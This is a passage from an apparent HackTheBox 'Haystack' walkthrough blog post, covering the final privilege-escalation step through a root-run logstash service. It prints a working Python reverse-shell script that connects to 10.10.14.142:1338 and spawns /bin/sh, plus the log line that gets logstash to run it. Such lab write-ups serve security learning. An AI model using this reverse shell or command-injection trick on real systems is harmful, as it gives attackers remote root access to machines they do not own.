/logstash-core/lib/jars/logstash-core.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.commands-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.contenttype-3.4.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.expressions-3.4.300.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.filesystem-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.jobs-3.5.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.resources-3.7.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.runtime-3.7.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.app-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.common-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.preferences-3.4.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.registry-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.jdt.core-3.10.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.osgi-3.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.text-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/slf4j-api-1.7.25.jar org.logstash.Logstash --path.settings /etc/logstash
kibana    17764  0.0  0.1 151424  5000 pts/5    S+   10:31   0:00 vim logstash_1
security  18412  0.0  0.0 112708   976 pts/0    R+   13:04   0:00 grep --color=auto logstash</code></pre></figure><p>There’s multiple ways to do it, but creating a python script for the reverse shell and calling the script with the Grok command should work. My reverse shell script:</p><figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python
</span><span class="kn">import</span> <span class="nn">socket</span><span class="p">,</span><span class="n">subprocess</span><span class="p">,</span><span class="n">os</span>

<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="s">"10.10.14.142"</span><span class="p">,</span><span class="mi">1338</span><span class="p">))</span>
<span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">)</span>
<span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span>
<span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">)</span>
<span class="n">p</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">call</span><span class="p">([</span><span class="s">"/bin/sh"</span><span class="p">,</span><span class="s">"-i"</span><span class="p">]);</span></code></pre></figure><p>And the Grok command to send:</p><figure class="highlight"><pre><code class="language-plain_text" data-lang="plain_text">Ejecutar comando: /tmp/rshell.py</code></pre></figure><p>And it’ll take a little while for the logstash routine to run the payload, but it does eventually work!</p><p><img class="alignnone size-full wp-image-375" data-src="/assets/img/2019/10/2019-10-04_14h30_08.png" data-proofer-ignore></p><p>From there, just grab the root flag and this box is done!!</p><p> </p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/walkthrough/'>Walkthrough</a>, <a href='/categories/hackthebox/'>HackTheBox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >Linux</a> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a> <a href="/tags/elasticsearch/" class="post-tag no-text-decoration" >elasticsearch</a> <a href="/tags/logstash/" class="post-tag no-text-decoration" >logstash</a> <a href="/tags/kibana/" class="post-tag no-text-decoration" >Kibana</a> <a href="/tags/stegonography/" class="post-tag no-text-decoration" >stegonography</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox: Haystack - MegaWattSec&amp;url=https://megawattsec.com/posts/hackthebox-haystack/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox: Haystack - MegaWattSec&amp;u=https://megawattsec.com/posts/hackthebox-haystack/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://megawattsec.com/posts/hackthebox-haystack/&amp;text=HackTheBox: Haystack - MegaWattSec" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/hackthebox-haystack/">HackTheBox: Haystack</a><li><a href="/posts/hackthebox-craft/">HackTheBox: Craft</a><li><a href="/posts/hackthebox-bastion/">HackTheBox: Bastion</a><li><a href="/posts/hackthebox-jarvis/">HackTheBox: Jarvis</a><li><a href="/posts/hackthebox-swagshop/">HackTheBox: SwagShop</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/mysql/">mysql</a> <a class="post-tag" href="/tags/perl/">perl</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/anti-csrf/">anti-csrf</a> <a class="post-tag" href="/tags/api/">api</a> <a class="post-tag" href="/tags/cve-2019-9185/">CVE-2019-9185</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/elasticsearch/">elasticsearch</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/hackthebox-craft/"><div class="card-body"> <em class="timeago small" data-ts="1575921294" > 2019-12-09 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox: Craft</h3><div class="text-muted small"><p> Recon and Scans NMAP Here is the output from Nmap, it shows several ports open. {% highlight plain_text %} nmap -n -Pn -sC -sV -p- 10.10.10.110 Starting Nmap 7.80 ( https://nmap.org ) at 2019-...</p></div></div></a></div><div class="card"> <a href="/posts/hackthebox-jarvis/"><div class="card-body"> <em class="timeago small" data-ts="1566223496" > 2019-08-19 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox: Jarvis</h3><div class="text-muted small"><p> Recon: The website isn’t bare, but most of the links found don’t actually go anywhere. The only page with anything really going on is ‘Rooms’, where you’ll find the links to the rooms are PHP re...</p></div></div></a></div><div class="card"> <a href="/posts/hackthebox-swagshop/"><div class="card-body"> <em class="timeago small" data-ts="1566232827" > 2019-08-19 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox: SwagShop</h3><div class="text-muted small"><p> Recon This site is a basic e-commerce site with just a few products filled in as examples. Magento is the platform and it’s very well-known. Port Scan NMAP doesn’t show anything out of the ord...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/overthewire-natas-29/" class="btn btn-outline-primary" prompt="Older"><p>OverTheWire: NATAS 29</p></a> <a href="/posts/overthewire-natas-30/" class="btn btn-outline-primary" prompt="Newer"><p>OverTheWire: NATAS 30</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/megawattsec">Dustin</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/mysql/">mysql</a> <a class="post-tag" href="/tags/perl/">perl</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/anti-csrf/">anti-csrf</a> <a class="post-tag" href="/tags/api/">api</a> <a class="post-tag" href="/tags/cve-2019-9185/">CVE-2019-9185</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/elasticsearch/">elasticsearch</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
